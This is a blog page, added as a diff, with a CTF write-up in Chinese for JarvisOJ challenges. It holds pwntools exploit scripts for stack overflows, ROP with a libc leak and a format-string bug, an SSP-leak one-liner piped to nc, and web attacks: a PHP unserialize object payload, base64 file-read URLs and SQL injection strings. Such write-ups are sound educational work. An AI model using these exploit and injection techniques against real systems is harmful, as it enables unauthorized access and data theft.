@@ -1,0 +1,1018 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Pwn," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/X.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="JarvisOJ WriteupPwn[XMAN]Level0程序中存在callsystem函数，栈溢出改返回地址即可 Vuln: ssize_t vulnerable_function()&amp;#123;  char buf; // [sp+0h] [bp-80h]@1  return read(0, &amp;amp;buf, 0x200uLL);&amp;#125; Exp: from pwn import *">
+<meta name="keywords" content="Pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JarvisOJ">
+<meta property="og:url" content="http://yoursite.com/CTF/Writeup/JarvisOJ/index.html">
+<meta property="og:site_name" content="Xu&#39;s Blog">
+<meta property="og:description" content="JarvisOJ WriteupPwn[XMAN]Level0程序中存在callsystem函数，栈溢出改返回地址即可 Vuln: ssize_t vulnerable_function()&amp;#123;  char buf; // [sp+0h] [bp-80h]@1  return read(0, &amp;amp;buf, 0x200uLL);&amp;#125; Exp: from pwn import *">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/CTF/Writeup/JarvisOJ/1.png">
+<meta property="og:updated_time" content="2017-08-25T09:51:38.811Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="JarvisOJ">
+<meta name="twitter:description" content="JarvisOJ WriteupPwn[XMAN]Level0程序中存在callsystem函数，栈溢出改返回地址即可 Vuln: ssize_t vulnerable_function()&amp;#123;  char buf; // [sp+0h] [bp-80h]@1  return read(0, &amp;amp;buf, 0x200uLL);&amp;#125; Exp: from pwn import *">
+<meta name="twitter:image" content="http://yoursite.com/CTF/Writeup/JarvisOJ/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/CTF/Writeup/JarvisOJ/"/>
+
+
+
+
+
+  <title>JarvisOJ | Xu's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <a href="https://github.com/XuCcc"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://camo.githubusercontent.com/38ef81f8aca64bb9a64448d0d70f1308ef5341ab/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f72696768745f6461726b626c75655f3132313632312e706e67" alt="Fork me on GitHub" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png"></a>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Xu's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/CTF/Writeup/JarvisOJ/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Xu">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xu's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">JarvisOJ</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-24T14:31:00+08:00">
+                2017-08-24
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2017-08-25T17:51:38+08:00">
+                2017-08-25
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/Writeup/" itemprop="url" rel="index">
+                    <span itemprop="name">Writeup</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="JarvisOJ-Writeup"><a href="#JarvisOJ-Writeup" class="headerlink" title="JarvisOJ Writeup"></a>JarvisOJ Writeup</h1><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="XMAN-Level0"><a href="#XMAN-Level0" class="headerlink" title="[XMAN]Level0"></a>[XMAN]Level0</h3><p>程序中存在<code>callsystem</code>函数，栈溢出改返回地址即可</p>
+<div class="note info"><p>Vuln:</p></div>
+<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">ssize_t</span> vulnerable_function()</div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-80h]@1</span></div><div class="line"></div><div class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<div class="note success"><p>Exp:</p></div>
+<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">pwn_file = <span class="string">"level0"</span>  <span class="comment"># pwn题文件</span></div><div class="line">binary = ELF(pwn_file)</div><div class="line"><span class="comment">#libc = ELF('')</span></div><div class="line"></div><div class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</div><div class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</div><div class="line">    io = remote(<span class="string">'127.0.0.1'</span>, <span class="number">12345</span>)</div><div class="line"><span class="keyword">elif</span> <span class="string">'-g'</span> <span class="keyword">in</span> sys.argv[<span class="number">1</span>:]:</div><div class="line">	io = process(pwn_file)</div><div class="line">	gdb.attach(io)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    io = process(pwn_file)</div><div class="line"></div><div class="line">offset = <span class="number">136</span></div><div class="line">address = binary.symbols[<span class="string">'callsystem'</span>]</div><div class="line"></div><div class="line">io.recv()</div><div class="line">payload = <span class="string">'A'</span> * offset + p64(address)</div><div class="line">io.send(payload)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
+<h3 id="XMAN-level2-x64"><a href="#XMAN-level2-x64" class="headerlink" title="[XMAN]level2(x64)"></a>[XMAN]level2(x64)</h3><div class="note info"><p>Vuln:</p></div>    
+<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">ssize_t</span> vulnerable_function()</div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-80h]@1</span></div><div class="line"></div><div class="line">  system(<span class="string">"echo Input:"</span>);</div><div class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<div class="note success"><p>Exp:</p></div>
+<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">pwn_file = <span class="string">"level2"</span>  <span class="comment"># pwn题文件</span></div><div class="line">binary = ELF(pwn_file)</div><div class="line"><span class="comment">#libc = ELF('')</span></div><div class="line"></div><div class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</div><div class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</div><div class="line">    io = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9882</span>)</div><div class="line"><span class="keyword">elif</span> <span class="string">'-g'</span> <span class="keyword">in</span> sys.argv[<span class="number">1</span>:]:</div><div class="line">	io = process(pwn_file)</div><div class="line">	gdb.attach(io)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    io = process(pwn_file)</div><div class="line"></div><div class="line">offset = <span class="number">136</span></div><div class="line">binshAddress = <span class="number">0x0000000000600a90</span></div><div class="line">poprdi = <span class="number">0x00000000004006b3</span></div><div class="line">systemAddress = binary.plt[<span class="string">'system'</span>]</div><div class="line"></div><div class="line">io.recv()</div><div class="line">payload = <span class="string">'A'</span> * offset + p64(poprdi) + p64(binshAddress) + p64(systemAddress)</div><div class="line">io.send(payload)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
+<h3 id="XMAN-level3-x64"><a href="#XMAN-level3-x64" class="headerlink" title="[XMAN]level3(x64)"></a>[XMAN]level3(x64)</h3><div class="note info"><p>Vuln:</p></div>
+<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">ssize_t</span> vulnerable_function()</div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-80h]@1</span></div><div class="line"></div><div class="line">  write(<span class="number">1</span>, <span class="string">"Input:\n"</span>, <span class="number">7u</span>LL);</div><div class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<div class="note success"><p>Exp:</p></div>
+<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">offset = <span class="number">136</span></div><div class="line"></div><div class="line">vuln = binary.symbols[<span class="string">'vulnerable_function'</span>]</div><div class="line">writePlt = binary.plt[<span class="string">'write'</span>]</div><div class="line">writeGot = binary.got[<span class="string">'write'</span>]</div><div class="line">poprdi = <span class="number">0x00000000004006b3</span></div><div class="line">poprsi = <span class="number">0x00000000004006b1</span></div><div class="line"></div><div class="line">io.recv()</div><div class="line">payload = <span class="string">'A'</span> * <span class="number">136</span> + p64(poprdi) + p64(<span class="number">1</span>) + p64(poprsi) + p64(writeGot) + p64(<span class="number">0</span>) + p64(writePlt) + p64(vuln)</div><div class="line">io.send(payload)</div><div class="line"></div><div class="line">writeAddress = u64(io.recv(<span class="number">8</span>))</div><div class="line">log.success(<span class="string">'writeAddress:'</span> + hex(writeAddress))</div><div class="line">io.recv()</div><div class="line"></div><div class="line">systemAddress = writeAddress + libc.symbols[<span class="string">'system'</span>] - libc.symbols[<span class="string">'write'</span>]</div><div class="line">binshAddresss = writeAddress + libc.search(<span class="string">'/bin/sh'</span>).next() - libc.symbols[<span class="string">'write'</span>]</div><div class="line">log.success(<span class="string">'systemAddress:'</span> + hex(systemAddress))</div><div class="line">log.success(<span class="string">'binshAddress:'</span> + hex(binshAddresss))</div><div class="line"></div><div class="line">payload = <span class="string">'A'</span> * offset + p64(poprdi) + p64(binshAddresss) + p64(systemAddress)</div><div class="line">io.send(payload)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
+<h3 id="Test-Your-Memory"><a href="#Test-Your-Memory" class="headerlink" title="Test Your Memory"></a>Test Your Memory</h3><div class="note success"><p>Exp:</p></div>
+<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">offset = <span class="number">23</span></div><div class="line">vulnAddress = binary.symbols[<span class="string">'mem_test'</span>]</div><div class="line">winPlt = binary.symbols[<span class="string">'win_func'</span>]</div><div class="line"></div><div class="line">io.recv()</div><div class="line">payload = <span class="string">''</span>.ljust(offset,<span class="string">"A"</span>) + p32(winPlt) + p32(<span class="number">0x80487e0</span>) + p32(<span class="number">0x80487e0</span>) </div><div class="line">io.sendline(payload)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
+<h3 id="Tell-Me-Somethine"><a href="#Tell-Me-Somethine" class="headerlink" title="Tell Me Somethine"></a>Tell Me Somethine</h3><div class="note success"><p>Exp:</p></div>
+<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">io = remote(<span class="string">"pwn.jarvisoj.com"</span>,<span class="number">9876</span>)</div><div class="line"></div><div class="line">payload = <span class="string">'\x00'</span>*<span class="number">136</span> + p64(<span class="number">0x0000000000400620</span>) </div><div class="line"></div><div class="line">io.recvuntil(<span class="string">"message:\n"</span>)</div><div class="line">io.sendline(payload)</div><div class="line"><span class="keyword">print</span> sh.recv()</div></pre></td></tr></table></figure>
+<h3 id="Smashes"><a href="#Smashes" class="headerlink" title="Smashes"></a>Smashes</h3><div class="note info"><p>Vuln:</p></div>
+<p>SSP(Stack Smashing Protector):</p>
+<p><code>__stack_chk_fail</code> 中的<code>__fortify_fail</code>在被触发栈保护时，会输出程序名称，这个参数从栈上得到，将此位置覆盖为flag地址即可输出flag的值.</p>
+<ul>
+<li><a href="https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200" target="_blank" rel="external">32C3 CTF 2015 : readme</a></li>
+</ul>
+<p>PS:环境变量问题在攻击远程时并没有遇见，可能出题者忘记设置了</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><div class="line">__<span class="function">int64 <span class="title">func</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  __int64 v0; <span class="comment">// rax@1</span></div><div class="line">  __int64 v1; <span class="comment">// rbx@2</span></div><div class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax@3</span></div><div class="line">  __int64 name; <span class="comment">// [sp+0h] [bp-128h]@1</span></div><div class="line">  __int64 canary; <span class="comment">// [sp+108h] [bp-20h]@1</span></div><div class="line">  canary = *MK_FP(__FS__, <span class="number">40L</span>L);</div><div class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Hello!\nWhat's your name? "</span>);</div><div class="line">  LODWORD(v0) = _IO_gets(&amp;name);</div><div class="line">  <span class="keyword">if</span> ( !v0 )</div><div class="line">LABEL_9:</div><div class="line">    _exit(<span class="number">1</span>);</div><div class="line">  v1 = <span class="number">0L</span>L;</div><div class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Nice to meet you, %s.\nPlease overwrite the flag: "</span>);</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    v2 = _IO_getc(<span class="built_in">stdin</span>);</div><div class="line">    <span class="keyword">if</span> ( v2 == <span class="number">-1</span> )</div><div class="line">      <span class="keyword">goto</span> LABEL_9;</div><div class="line">    <span class="keyword">if</span> ( v2 == <span class="number">10</span> )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    byte_600D20[v1++] = v2;</div><div class="line">    <span class="keyword">if</span> ( v1 == <span class="number">32</span> )</div><div class="line">      <span class="keyword">goto</span> LABEL_8;</div><div class="line">  &#125;</div><div class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span> *)((<span class="keyword">signed</span> <span class="keyword">int</span>)v1 + <span class="number">6294816L</span>L), <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">32</span> - v1));</div><div class="line">LABEL_8:</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Thank you, bye!"</span>);</div><div class="line">  <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40L</span>L) ^ canary;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<div class="note success"><p>Exp:</p></div>
+<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root in ~/Desktop/tmp λ python -c 'print "A"*536 + "\x20\x0d\x40\x00\x00\x00\x00\x00" + "\n" + "A"'|nc pwn.jarvisoj.com 9877</div><div class="line">Hello!</div><div class="line">What's your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</div><div class="line">Please overwrite the flag: Thank you, bye!</div><div class="line">*** stack smashing detected ***: PCTF&#123;57dErr_Smasher_good_work!&#125; terminated</div></pre></td></tr></table></figure>
+<h3 id="Guess"><a href="#Guess" class="headerlink" title="Guess"></a>Guess</h3><p><a href="http://www.jianshu.com/p/40f846d14450" target="_blank" rel="external">TODO</a></p>
+<h3 id="61dctf-fm"><a href="#61dctf-fm" class="headerlink" title="[61dctf]fm"></a>[61dctf]fm</h3><div class="note info"><p>Vuln</p></div>
+<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@3</span></div><div class="line">  <span class="keyword">int</span> v4; <span class="comment">// edx@3</span></div><div class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+2Ch] [bp-5Ch]@1</span></div><div class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+7Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  v6 = *MK_FP(__GS__, <span class="number">20</span>);</div><div class="line">  be_nice_to_people();</div><div class="line">  <span class="built_in">memset</span>(&amp;v5, <span class="number">0</span>, <span class="number">0x50</span>u);</div><div class="line">  read(<span class="number">0</span>, &amp;v5, <span class="number">0x50</span>u);</div><div class="line">  <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v5);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"%d!\n"</span>, x);</div><div class="line">  <span class="keyword">if</span> ( x == <span class="number">4</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"running sh..."</span>);</div><div class="line">    system(<span class="string">"/bin/sh"</span>);</div><div class="line">  &#125;</div><div class="line">  result = <span class="number">0</span>;</div><div class="line">  v4 = *MK_FP(__GS__, <span class="number">20</span>) ^ v6;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<div class="note success"><p>Exp</p></div>
+<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">payload = p32(<span class="number">0x0804A02C</span>) + <span class="string">"%11$n"</span></div><div class="line">io.send(payload)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h3><p>文件读取，访问 <a href="http://web.jarvisoj.com:32768/showimg.php?img=c2hvd2ltZy5waHA=" target="_blank" rel="external">http://web.jarvisoj.com:32768/showimg.php?img=c2hvd2ltZy5waHA=</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">        $f = $_GET[<span class="string">'img'</span>];</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</div><div class="line">                $f = base64_decode($f);</div><div class="line">                <span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span></div><div class="line">                &amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;     <span class="comment">//stripos()查找字符串在另一串字符串中的位置</span></div><div class="line">                        readfile($f);</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                        <span class="keyword">echo</span> <span class="string">"File not found!"</span>;</div><div class="line">               &#125;</div><div class="line">       &#125;<span class="meta">?&gt;</span>访问http:<span class="comment">//web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw 读取index.php中函数<span class="meta">&lt;?php</span></span></div><div class="line">        <span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</div><div class="line">  <span class="comment">//require_once()语句在脚本执行期间包含并运行指定文件(通俗一点，括号内的文件会执行一遍)。</span></div><div class="line">        $x = <span class="keyword">new</span> Shield();</div><div class="line">        <span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</div><div class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</div><div class="line">                $x = unserialize($g);<span class="comment">//unserialize() 将已序列化的字符串还原回 PHP 的值</span></div><div class="line">        &#125;</div><div class="line">        <span class="keyword">echo</span> $x-&gt;readfile();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>访问<a href="http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocA==" target="_blank" rel="external">http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocA==</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">        <span class="comment">//flag is in pctf.php</span></div><div class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</div><div class="line">                <span class="keyword">public</span> $file;</div><div class="line">                <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</div><div class="line">                        <span class="keyword">$this</span> -&gt; file = $filename;</div><div class="line">                &#125;</div><div class="line"></div><div class="line"><span class="comment">//通常构造方法被用来执行一些有用的初始化任务，如对成员属性在创建对象时赋予初始值。//function __constrct([参数列表])&#123;//方法体//通常用来对成员属性进行初始化赋值//&#125;</span></div><div class="line">                <span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</div><div class="line">                       <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span></div><div class="line">                       &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</div><div class="line">                               <span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</div><div class="line">                       &#125;</div><div class="line">               &#125;</div><div class="line">       &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>pctf.php序列化值为 <code>O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></p>
+<p>访问 <a href="http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}" target="_blank" rel="external">http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}</a></p>
+<h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>查看http头 <code>Hint：&quot;select * from</code>admin<code>where password=&#39;&quot;.md5($pass,true).&quot;&#39;&quot;</code></p>
+<p><a href="http://www.ilrose.com/blog/2015/07/08/md5%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84sql-%E6%B3%A8%E5%85%A5/" target="_blank" rel="external">‘“.md5($pass,true).”‘类注入</a></p>
+<h3 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h3><p>首先确定用户名为admin，采用分步验证的方式</p>
+<div class="note info"><p>E.g</p></div>
+<figure class="highlight php"><table><tr><td class="code"><pre><div class="line">$sql = <span class="string">"select password from users where username='$username'"</span>$result = mysql_query($sql);<span class="keyword">if</span>($result) &#123;</div><div class="line">    $row = mysql_fetch_row($result);</div><div class="line">    $query_password = $row[$password];</div><div class="line">    <span class="comment">//对输入的$password进行变形</span></div><div class="line">    $input_password = modify($passowrd);</div><div class="line">    <span class="keyword">if</span>($input_password == $query_password) &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"登陆成功"</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"密码错误"</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"用户不存在"</span>;&#125;</div></pre></td></tr></table></figure>
+<p>admin测试发现对#注释符未过滤,使用payload能够被执行 <code>username=a&#39;/**/or/**/1=1#&amp;password=123</code></p>
+<p><img src="/CTF/Writeup/JarvisOJ/1.png" alt="1"></p>
+<p>总结应该是个盲注.查询相关表 列，构造正确sql语句查询password，使用mysql中exists函数</p>
+<p><strong>EXISTS代表存在量词∃。带有EXISTS谓词的子查询不返回任何数据，只产生逻辑真值“true”或者逻辑假值“false”。</strong></p>
